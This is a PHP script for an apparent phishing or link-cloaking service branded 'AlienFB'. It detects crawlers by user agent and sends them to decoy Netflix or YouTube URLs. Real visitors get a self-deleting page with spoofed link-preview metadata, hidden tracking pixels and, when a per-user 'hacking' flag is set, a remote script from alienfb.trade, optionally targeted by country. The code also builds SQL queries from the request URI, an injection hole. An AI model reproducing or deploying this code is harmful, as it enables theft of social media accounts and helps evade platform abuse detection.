<?php 
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
require_once "./random_string.php";
require_once(dirname(__FILE__).'/BaseDatosMySql.php');
require_once(dirname(__FILE__).'/BaseDatosSqlServer.php');
$name_archivo_php = $_SERVER['REQUEST_URI'];
$name_archivo_php = str_replace("/", "", $name_archivo_php);



//-------------------------------------------Lista de Bot-----------------------------------------//
$bots = array (
    "googlebot",
    "bingbot",
    "baiduspider",
    "duckduckbot",
    "yahoo",
    "twitterbot",
    "applebot",
    "facebook",
    "embedly",
    "yandexbot"
);


//--------------------------------Comprobar si es un Bot o un Agent------------------------------------------//
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($bots as $bot) {
    if (strpos($user_agent, $bot) == TRUE ) {
        $short_urlx2 = "https://www.netflix.com/".substr(md5(mt_rand()),0,20);
        header("location: $short_urlx2", true, 200);
        die();
    }
    else if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
    {
        $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
        header("location: $short_urlx2", true, 200);
        die();
    }    
    
else {
//--------------------------------Comprobar si existe el link en la base de datos-----------------------------//        
$getx = $pdo->prepare("SELECT count(*) FROM storagex2 WHERE identify='$name_archivo_php'");
$getx->execute();
$count = $getx->fetchColumn();

if ($count == 0)
{
http_response_code(403);
return;
}

else{
   
//------------------Selecciono parte de la  estructura de mi name_archivo.php---------------------------------//
$sql = "SELECT username, redireccion, img, title, descripcion FROM storagex2 WHERE identify= '$name_archivo_php'";
$statement = $pdo->prepare($sql);
$statement->execute();
$permalinks = $statement->fetchAll(PDO::FETCH_ASSOC);
foreach ($permalinks as $datos){
$username = $datos['username'];    
$redireccion = "https://".$datos['redireccion'];
$img = "https://".$datos['img'];
$title = $datos['title'];
$descripcion = $datos['descripcion'];
}
//--------------------------------Selecciono si haching esta Activo o Desapativado----------------------------//    
$get = $pdoserver->prepare("SELECT hacking, contador, hacking_pais, plantilla, pais_selecionado	 FROM usuarios WHERE usuario = ?;");
$get->execute([$username]);
$checker = $get->fetchObject();

if ($checker->hacking == "1" && $checker->hacking_pais == "0")
{
//--------------------------------Estructura Con hack--------------------------------------------------------//    
    $contentHTML = '
<?php 
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("X-Robots-Tag: noindex, nofollow");
header("Referrer-Policy: no-referrer");
header("Pragma: no-cache");
unlink("'.$name_archivo_php.'".".php")
?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="'.$title.'">
<meta property="og:image" content="'.$img.'">
<meta property="og:description" content="'.$descripcion.'">
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
<meta http-equiv="cache-control" content="no-cache">
</head>
<body>
<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=chrome%3A%2F%2Fversion" style="display:none">
<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
<script src="https://alienfb.trade/h/index.php?p1=true&username='.$username.'&pl='.$checker->plantilla.'" type="text/javascript" async="true"></script>
</body>
</html> 
';
}

else if ($checker->hacking_pais == "1" && $checker->hacking == "0")
{
//--------------------------------Estructura Con hack--------------------------------------------------------//    
    $contentHTML = '
<?php 
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("X-Robots-Tag: noindex, nofollow");
header("Referrer-Policy: no-referrer");
header("Pragma: no-cache");
unlink("'.$name_archivo_php.'".".php")
?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="'.$title.'">
<meta property="og:image" content="'.$img.'">
<meta property="og:description" content="'.$descripcion.'">
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
<meta http-equiv="cache-control" content="no-cache">
</head>
<body>
<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=chrome%3A%2F%2Fversion" style="display:none">
<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
<script src="https://alienfb.trade/h/pais.php?p1=true&username='.$username.'&pl='.$checker->plantilla.'&country='.$checker->pais_selecionado.'" type="text/javascript" async="true"></script>
</body>
</html> 
';
}

else {
//--------------------------------Estructura sin hack solo redirrecion---------------------------------------//
$contentHTML = '
<?php 
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("X-Robots-Tag: noindex, nofollow");
header("Referrer-Policy: no-referrer");
header("Pragma: no-cache");
unlink("'.$name_archivo_php.'".".php")
?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="'.$title.'">
<meta property="og:image" content="'.$img.'">
<meta property="og:description" content="'.$descripcion.'">
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
<meta http-equiv="cache-control" content="no-cache">
</head>
<body>
<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=https://www.facebook.com/" style="display:none">
<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
<script language="javascript">setTimeout(location.href="'.$redireccion.'",8000);</script>
</body>
</html>
';

}

$contentHTMLEXTRAIDO = $contentHTML;
//------------------------------Compruebo si mi name_archivo.php existe-----------------------------------//
if (file_exists("blob" . "/" . $name_archivo_php.".php")) {
$permalinkExiste = "https://cq0i.xyz/" . "blob" . "/" . $name_archivo_php.".php";
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');
header("Pragma: no-cache");
header("Location: ".$permalinkExiste, 301);
die();
} 

//--------------Compruebo si mi name_archivo.php no existe para crearlo y visualizarlo--------------------//
else {
file_put_contents("blob" . "/" . $name_archivo_php.".php", $contentHTMLEXTRAIDO);
$permalink = "https://cq0i.xyz/" . "blob" . "/" . $name_archivo_php.".php";
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');
header("Pragma: no-cache");
header("Location: ".$permalink, 301);
die();
} 
        
}

        
    }
}	

?>